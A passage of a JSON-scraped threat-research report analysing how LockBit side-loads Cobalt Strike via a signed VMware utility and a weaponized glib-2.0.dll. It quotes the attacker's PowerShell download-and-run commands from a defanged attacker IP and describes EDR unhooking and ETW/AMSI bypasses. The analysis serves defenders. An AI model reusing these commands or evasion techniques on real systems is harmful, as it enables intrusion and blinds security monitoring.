{
    "id": "<report_0x7efdf8de>",
    "url": "https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility",
    "title": "LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility",
    "meta": [],
    "chapters": [
        {
            "id": "<chapter_0xf5658ca0>",
            "title": "LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x388319aa>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xf2f44fd4>": "https://www.sentinelone.com/blog/author/jamesh/"
                    },
                    "text": "James Haughom",
                    "html": "<a class=\"\" href=\"https://www.sentinelone.com/blog/author/jamesh/\">\nJames Haughom </a>"
                },
                {
                    "id": "<sentence_0xe4bca68b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "/",
                    "html": "\n/\n"
                },
                {
                    "id": "<sentence_0x51c18cd3>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x3cca60c8>": "https://www.sentinelone.com/blog/2022/04/"
                    },
                    "text": "April 27, 2022",
                    "html": "<a href=\"https://www.sentinelone.com/blog/2022/04/\" rel=\"bookmark\">\nApril 27, 2022\n</a>"
                }
            ]
        },
        {
            "id": "<chapter_0x2faa39a7>",
            "title": "LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility",
            "title_level": 1,
            "sentences": [
                {
                    "id": "<sentence_0x751ffffd>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x5225c91>": "https://www.sentinelone.com/labs/category/crimeware/"
                    },
                    "text": "Crimeware",
                    "html": "<a href=\"https://www.sentinelone.com/labs/category/crimeware/\">Crimeware</a>"
                }
            ]
        },
        {
            "id": "<chapter_0xc9904699>",
            "title": "By James Haughom, Jlio Dantas, and Jim Walter",
            "title_level": 3,
            "sentences": []
        },
        {
            "id": "<chapter_0x6bb859c0>",
            "title": "Executive Summary",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x113b81cd>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI).",
                    "html": "<ul>\n<li>The VMware command line utility <code>VMwareXferlogs.exe</code> used for data transfer to and from VMX logs is susceptible to DLL side-loading.</li>\n<li>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.</li>\n<li>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a <code>.log</code> file containing an encrypted Cobalt Strike Reflective Loader.</li>\n<li>The malicious DLL evades defenses by removing EDR/EPP\u2019s userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI).</li>\n</ul>"
                }
            ]
        },
        {
            "id": "<chapter_0xfd4fc2c0>",
            "title": "Overview",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x1a7bab91>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "LockBit is a Ransomware as a Service (RaaS) operation that has been active since 2019 (previously known as ABCD). It commonly leverages the double extortion technique, employing tools such as StealBit, WinSCP, and cloud-based backup solutions for data exfiltration prior to deploying the ransomware. Like most ransomware groups, LockBits post-exploitation tool of choice is Cobalt Strike.",
                    "html": "<p>LockBit is a Ransomware as a Service (RaaS) operation that has been active since 2019 (previously known as \u201cABCD\u201d). It commonly leverages the double extortion technique, employing tools such as StealBit, WinSCP, and cloud-based backup solutions for data exfiltration prior to deploying the ransomware. Like most ransomware groups, LockBit\u2019s post-exploitation tool of choice is Cobalt Strike.</p>"
                },
                {
                    "id": "<sentence_0x72dd0e3d>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x17ec20e9>": "https://www.sentinelone.com/global-services/vigilance-respond-pro/"
                    },
                    "text": "During a recent investigation, our DFIR team discovered an interesting technique used by LockBit Ransomware Group to load a Cobalt Strike Beacon Reflective Loader. In this particular case, LockBit managed to side-load Cobalt Strike Beacon through a signed VMware xfer logs command line utility.",
                    "html": "<p>During a recent investigation, our <a href=\"https://www.sentinelone.com/global-services/vigilance-respond-pro/\" rel=\"noopener noreferrer\" target=\"_blank\">DFIR</a> team discovered an interesting technique used by LockBit Ransomware Group to load a Cobalt Strike Beacon Reflective Loader. In this particular case, LockBit managed to side-load Cobalt Strike Beacon through a signed VMware xfer logs command line utility.</p>"
                },
                {
                    "id": "<sentence_0x4ad05c3b>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xb737355>": "https://attack.mitre.org/techniques/T1574/002/",
                        "<code_0x11a6c805>": ".log",
                        "<code_0x80c421c3>": "cmd.exe"
                    },
                    "text": "Side-loading is a DLL-hijacking technique used to trick a benign process into loading and executing a malicious DLL by placing the DLL alongside the process corresponding EXE, taking advantage of the DLL search order. In this instance, the threat actor used PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader. The VMware utility was then executed via cmd.exe, passing control flow to the malicious DLL.",
                    "html": "<p><a href=\"https://attack.mitre.org/techniques/T1574/002/\" rel=\"noopener noreferrer\" target=\"_blank\">Side-loading</a> is a DLL-hijacking technique used to trick a benign process into loading and executing a malicious DLL by placing the DLL alongside the process\u2019 corresponding EXE, taking advantage of the DLL search order. In this instance, the threat actor used PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a <code>.log</code> file containing an encrypted Cobalt Strike Reflective Loader. The VMware utility was then executed via <code>cmd.exe</code>, passing control flow to the malicious DLL.</p>"
                },
                {
                    "id": "<sentence_0xc2714455>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x9609df11>": "https://docs.microsoft.com/en-us/windows/win32/etw/event-tracing-portal",
                        "<a_0xb9f097e2>": "https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal",
                        "<a_0xaa84e78>": "https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls",
                        "<code_0x5096f70c>": ".log"
                    },
                    "text": "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon.",
                    "html": "<p>The DLL then proceeded to evade defenses by removing EDR/EPP\u2019s userland hooks, as well as bypassing both <a href=\"https://docs.microsoft.com/en-us/windows/win32/etw/event-tracing-portal\" rel=\"noopener noreferrer\" target=\"_blank\">Event Tracing for Windows</a> (ETW) and <a href=\"https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal\" rel=\"noopener noreferrer\" target=\"_blank\">Antimalware Scan Interface</a> (AMSI). The <code>.log</code> file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode <a href=\"https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls\" rel=\"noopener noreferrer\" target=\"_blank\">Asynchronous Procedure Call</a> (APC) is queued, which is used to pass control flow to the decrypted Beacon.</p>"
                },
                {
                    "id": "<sentence_0x7dc2d380>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x70d81950>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/S1-Diagram_Light-scaled.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "",
                    "html": "<p><img alt=\"\" class=\"aligncenter size-full wp-image-66002\" height=\"1910\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/S1-Diagram_Light-scaled.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"2560\"/></p>"
                }
            ]
        },
        {
            "id": "<chapter_0x58bc4d20>",
            "title": "Attack Chain",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xefe67fdc>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x61b95f9b>": ".log"
                    },
                    "text": "The attack chain began with several PowerShell commands executed by the threat actor to download three components, a malicious DLL, a signed VMwareXferlogs executable, and an encrypted Cobalt Strike payload in the form of a .log file.",
                    "html": "<p>The attack chain began with several PowerShell commands executed by the threat actor to download three components, a malicious DLL, a signed VMwareXferlogs executable, and an encrypted Cobalt Strike payload in the form of a <code>.log</code> file.</p>"
                },
                {
                    "id": "<sentence_0x2f8a83c4>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0x7d9e5735>": {
                            "0": {
                                "0": "Filename",
                                "1": "glib-2.0.dll",
                                "2": "VMwareXferlogs.exe",
                                "3": "c0000015.log"
                            },
                            "1": {
                                "0": "Description",
                                "1": "Weaponized DLL loaded by VMwareXferlogs.exe",
                                "2": "Legitimate/signed VMware command line utility",
                                "3": "Encrypted Cobalt Strike payload"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table>\n<tbody>\n<tr>\n<td>Filename</td>\n<td>Description</td>\n</tr>\n<tr>\n<td>glib-2.0.dll</td>\n<td>Weaponized DLL loaded by VMwareXferlogs.exe</td>\n</tr>\n<tr>\n<td>VMwareXferlogs.exe</td>\n<td>Legitimate/signed VMware command line utility</td>\n</tr>\n<tr>\n<td>c0000015.log</td>\n<td>Encrypted Cobalt Strike payload</td>\n</tr>\n</tbody>\n</table>"
                },
                {
                    "id": "<sentence_0xe4f46f3f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Our DFIR team recovered the complete PowerShell cmdlets used to download the components from forensic artifacts.",
                    "html": "<p>Our DFIR team recovered the complete PowerShell cmdlets used to download the components from forensic artifacts.</p>"
                },
                {
                    "id": "<sentence_0x1884026c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/glib-2.0.dll -OutFile c:\\windows\\debug\\glib-2.0.dll;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/c0000015.log -OutFile c:\\windows\\debug\\c0000015.log;<crlf>Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile c:\\windows\\debug\\VMwareXferlogs.exe;c:\\windows\\debug\\VMwareXferlogs.exe",
                    "html": "\nInvoke-WebRequest -uri hxxp://45.32.108[.]54:443/glib-2.0.dll -OutFile c:\\windows\\debug\\glib-2.0.dll;\nInvoke-WebRequest -uri hxxp://45.32.108[.]54:443/c0000015.log -OutFile c:\\windows\\debug\\c0000015.log;\nInvoke-WebRequest -uri hxxp://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile c:\\windows\\debug\\VMwareXferlogs.exe;c:\\windows\\debug\\VMwareXferlogs.exe\n"
                },
                {
                    "id": "<sentence_0x88d329d4>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xb044d309>": "VMwareXferlogs.exe"
                    },
                    "text": "The downloaded binary (VMwareXferlogs.exe) was then executed via the command prompt, with the STDOUT being redirected to a file.",
                    "html": "<p>The downloaded binary (<code>VMwareXferlogs.exe</code>) was then executed via the command prompt, with the STDOUT being redirected to a file.</p>"
                },
                {
                    "id": "<sentence_0xc5c4ad00>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "c:\\windows\\debug\\VMwareXferlogs.exe 1><crlf>\\\\127.0.0.1\\ADMIN$\\__1649832485.0836577 2>&1",
                    "html": "\nc:\\windows\\debug\\VMwareXferlogs.exe 1> \n\\\\127.0.0.1\\ADMIN$\\__1649832485.0836577 2>&1\n"
                },
                {
                    "id": "<sentence_0xd44a1dc5>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xd78a7394>": "https://www.virustotal.com/gui/file/935e10f5169397a67f4c36bffbc3ba46c3957b7521edd3fa83bd975157b79bd8/details",
                        "<code_0xe1b4ab6f>": "VMwareXferlogs.exe"
                    },
                    "text": "The VMwareXferlogs.exe is a legitimate, signed executable belonging to VMware.",
                    "html": "<p>The <a href=\"https://www.virustotal.com/gui/file/935e10f5169397a67f4c36bffbc3ba46c3957b7521edd3fa83bd975157b79bd8/details\" rel=\"noopener noreferrer\" target=\"_blank\"><code>VMwareXferlogs.exe</code></a> is a legitimate, signed executable belonging to VMware.</p>"
                },
                {
                    "id": "<sentence_0xb27af82b>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xffefa271>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/signature-info.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "VirusTotal Signature Summary",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65964\"><img alt=\"\" class=\"size-full wp-image-65964\" height=\"912\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/signature-info.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"670\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65964\">VirusTotal Signature Summary</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x37857b18>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x13128fa0>": "https://kb.vmware.com/s/article/1019471"
                    },
                    "text": "This utility is used to transfer data to and from VMX logs.",
                    "html": "<p>This utility is used to transfer data to and from <a href=\"https://kb.vmware.com/s/article/1019471\" rel=\"noopener noreferrer\" target=\"_blank\">VMX</a> logs.</p>"
                },
                {
                    "id": "<sentence_0x55ac9f33>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xd46c12cf>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/VMware-options.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "VMware xfer utility command line usage",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65959\"><img alt=\"\" class=\"size-full wp-image-65959\" height=\"400\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/VMware-options.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1560\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65959\">VMware xfer utility command line usage</figcaption></figure>"
                },
                {
                    "id": "<sentence_0xb5b0c295>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x49aa9c4b>": "glib-2.0.dll",
                        "<code_0x6ef38ce5>": "glib-2.0.dll"
                    },
                    "text": "This command line utility makes several calls to a third party library called glib-2.0.dll. Both the utility and a legitimate version of glib-2.0.dll are shipped with VMware installations.",
                    "html": "<p>This command line utility makes several calls to a third party library called <code>glib-2.0.dll</code>. Both the utility and a legitimate version of <code>glib-2.0.dll</code> are shipped with VMware installations.</p>"
                },
                {
                    "id": "<sentence_0xe28ab3bd>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xfc79bb48>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/empty-calls.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "glib-2.0.dll functions being called by VMwareXferlog.exe",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65975\"><img alt=\"\" class=\"size-full wp-image-65975\" height=\"428\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/empty-calls.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1242\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65975\">glib-2.0.dll functions being called by VMwareXferlog.exe</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x780682ac>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x9445dc40>": "glib-2.0.dll",
                        "<code_0x13e53a79>": "VMwareXferlog.exe"
                    },
                    "text": "The weaponized glib-2.0.dll downloaded by the threat actor exports all the necessary functions imported by VMwareXferlog.exe.",
                    "html": "<p>The weaponized <code>glib-2.0.dll</code> downloaded by the threat actor exports all the necessary functions imported by <code>VMwareXferlog.exe</code>.</p>"
                },
                {
                    "id": "<sentence_0x62ab590e>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x28575e20>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/iE.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "Exported functions of malicious glib-2.0.dll",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65955\"><img alt=\"\" class=\"size-full wp-image-65955\" height=\"412\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/iE.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1266\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65955\">Exported functions of malicious glib-2.0.dll</figcaption></figure>"
                },
                {
                    "id": "<sentence_0xbcdeb8d3>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xaee75055>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/glib-imports.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "glib-2.0.dll-related functions imported by VMwareXferlog.exe",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65970\"><img alt=\"\" class=\"size-full wp-image-65970\" height=\"314\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/glib-imports.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1026\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65970\">glib-2.0.dll-related functions imported by VMwareXferlog.exe</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x8220f3f0>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x4e6058eb>": "glib-2.0.dll",
                        "<code_0x77538d33>": "g_path_get_basename()"
                    },
                    "text": "Calls to exported functions from glib-2.0.dll are made within the main function of the VMware utility, the first being g_path_get_basename().",
                    "html": "<p>Calls to exported functions from <code>glib-2.0.dll</code> are made within the main function of the VMware utility, the first being <code>g_path_get_basename()</code>.</p>"
                },
                {
                    "id": "<sentence_0xd60b2096>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xfc79bb48>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/empty-calls.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "glib-2.0.dll functions being called by VMwareXferlog.exe",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65975\"><img alt=\"\" class=\"size-full wp-image-65975\" height=\"428\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/empty-calls.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1242\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65975\">glib-2.0.dll functions being called by VMwareXferlog.exe</figcaption></figure>"
                },
                {
                    "id": "<sentence_0xf10aa353>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x14cb454a>": "glib-2.0.dll",
                        "<code_0x183b8ee3>": "g_path_get_basename",
                        "<code_0x9448a3a1>": "g_path_get_basename",
                        "<code_0x3510b3e9>": "ExitProcess()"
                    },
                    "text": "Note that the virtual addresses for the exported functions are all the same for the weaponized glib-2.0.dll (0x1800020d0), except for g_path_get_basename, which has a virtual address of 0x180002420. This is due to the fact that all exports, except for the g_path_get_basename function do nothing other than call ExitProcess().",
                    "html": "<p>Note that the virtual addresses for the exported functions are all the same for the weaponized <code>glib-2.0.dll</code> (0x1800020d0), except for <code>g_path_get_basename</code>, which has a virtual address of 0x180002420. This is due to the fact that all exports, except for the <code>g_path_get_basename</code> function do nothing other than call <code>ExitProcess()</code>.</p>"
                },
                {
                    "id": "<sentence_0xdff4fd01>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x8cf1d89f>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/disassembly-of-glib_2_dll.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "g_error_free() functions logic",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65966\"><img alt=\"\" class=\"size-full wp-image-65966\" height=\"380\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/disassembly-of-glib_2_dll.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1252\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65966\">g_error_free() function\u2019s logic</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x2c1e1c3d>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xdb1f1d6a>": "g_path_get_basename()"
                    },
                    "text": "On the other hand, g_path_get_basename() invokes the malicious payload prior to exiting.",
                    "html": "<p>On the other hand, <code>g_path_get_basename()</code> invokes the malicious payload prior to exiting.</p>"
                },
                {
                    "id": "<sentence_0xd45372cb>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xbb48690f>": "VMwareXferlog.exe",
                        "<code_0xcd437c11>": "glib-2.0.dll"
                    },
                    "text": "When VMwareXferlog.exe calls this function, control flow is transferred to the malicious glib-2.0.dll, rather than the legitimate one, completing the side-loading attack.",
                    "html": "<p>When <code>VMwareXferlog.exe</code> calls this function, control flow is transferred to the malicious <code>glib-2.0.dll</code>, rather than the legitimate one, completing the side-loading attack.</p>"
                },
                {
                    "id": "<sentence_0x32d01cd2>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x70da5290>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/basename-disassembly.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "g_path_get_basename() being called in the main() function",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65973\"><img alt=\"\" class=\"size-full wp-image-65973\" height=\"154\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/basename-disassembly.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1250\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65973\">g_path_get_basename() being called in the main() function</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x68da05ba>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x7802e8b4>": "https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb",
                        "<code_0xc064e4a7>": "BeingDebugged",
                        "<code_0xe7b112ad>": "NtGlobalFlag"
                    },
                    "text": "Once control flow is passed to the weaponized DLL, the presence of a debugger is checked by querying the BeingDebugged flag and NtGlobalFlag in the Process Environment Block (PEB). If a debugger is detected, the malware enters an endless loop.",
                    "html": "<p>Once control flow is passed to the weaponized DLL, the presence of a debugger is checked by querying the <code>BeingDebugged</code> flag and <code>NtGlobalFlag</code> in the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb\" rel=\"noopener noreferrer\" target=\"_blank\">Process Environment Block</a> (PEB). If a debugger is detected, the malware enters an endless loop.</p>"
                },
                {
                    "id": "<sentence_0xfcf4e95c>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x2b5c68c8>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/BeingDebugged.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "Anti-debug mechanisms",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65968\"><img alt=\"\" class=\"size-full wp-image-65968\" height=\"596\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/BeingDebugged.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1446\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65968\">Anti-debug mechanisms</figcaption></figure>"
                }
            ]
        },
        {
            "id": "<chapter_0x122aa3c7>",
            "title": "Bypassing EDR/EPP Userland Hooks",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x62b7eb08>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "At this juncture, the malware enters a routine to bypass any userland hooks by manually mapping itself into memory, performing a byte-to-byte inspection for any discrepancies between the copy of self and itself, and then overwriting any sections that have discrepancies.",
                    "html": "<p>At this juncture, the malware enters a routine to bypass any userland hooks by manually mapping itself into memory, performing a byte-to-byte inspection for any discrepancies between the copy of self and itself, and then overwriting any sections that have discrepancies.</p>"
                },
                {
                    "id": "<sentence_0x25cc2d14>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "This routine is repeated for all loaded modules, thus allowing the malware to identify any potential userland hooks installed by EDR/EPP, and overwrite them with the unpatched/unhooked code directly from the modules images on disk.",
                    "html": "<p>This routine is repeated for all loaded modules, thus allowing the malware to identify any potential userland hooks installed by EDR/EPP, and overwrite them with the unpatched/unhooked code directly from the modules\u2019 images on disk.</p>"
                },
                {
                    "id": "<sentence_0x69c02159>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x6a70cafb>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/memcpy.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "Checking for discrepancies between on-disk and in-memory for each loaded module",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65954\"><img alt=\"\" class=\"size-full wp-image-65954\" height=\"262\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/memcpy.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1148\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65954\">Checking for discrepancies between on-disk and in-memory for each loaded module</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x266e3b76>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "For example, EDRs userland NT layer hooks may be removed with this technique. The below subroutine shows a trampoline where a SYSCALL stub would typically reside, but instead jumps to a DLL injected by EDR. This subroutine will be overwritten/restored to remove the hook.",
                    "html": "<p>For example, EDR\u2019s userland NT layer hooks may be removed with this technique. The below subroutine shows a trampoline where a SYSCALL stub would typically reside, but instead jumps to a DLL injected by EDR. This subroutine will be overwritten/restored to remove the hook.</p>"
                },
                {
                    "id": "<sentence_0xb27a2832>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xaf1caa67>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/jmp.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "EDR-hooked SYSCALL stub that will be patched",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65958\"><img alt=\"\" class=\"size-full wp-image-65958\" height=\"140\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/jmp.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1038\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65958\">EDR-hooked SYSCALL stub that will be patched</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x97ccc22a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Here is a look at the patched code to restore the original SYSCALL stub and remove the EDR hook.",
                    "html": "<p>Here is a look at the patched code to restore the original SYSCALL stub and remove the EDR hook.</p>"
                },
                {
                    "id": "<sentence_0xe56b5659>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x5cfd3aae>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/syscall.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "NT layer hook removed and original code restored",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65972\"><img alt=\"\" class=\"size-full wp-image-65972\" height=\"270\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/syscall.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1074\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65972\">NT layer hook removed and original code restored</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x8c2edba6>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x9601a24f>": "EtwEventWrite"
                    },
                    "text": "Once these hooks are removed, the malware continues to evade defenses. Next, an attempt to bypass Event Tracing for Windows (ETW) commences through patching the EtwEventWrite WinAPI with a RET instruction (0xC3), stopping any useful ETW-related telemetry from being generated related to this process.",
                    "html": "<p>Once these hooks are removed, the malware continues to evade defenses. Next, an attempt to bypass Event Tracing for Windows (ETW) commences through patching the <code>EtwEventWrite</code> WinAPI with a RET instruction (0xC3), stopping any useful ETW-related telemetry from being generated related to this process.</p>"
                },
                {
                    "id": "<sentence_0xd97cf8d>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0x92b08680>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/ETW.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "Event Tracing for Windows bypass",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65974\"><img alt=\"\" class=\"size-full wp-image-65974\" height=\"458\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/ETW.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"1368\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65974\">Event Tracing for Windows bypass</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x97380c85>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
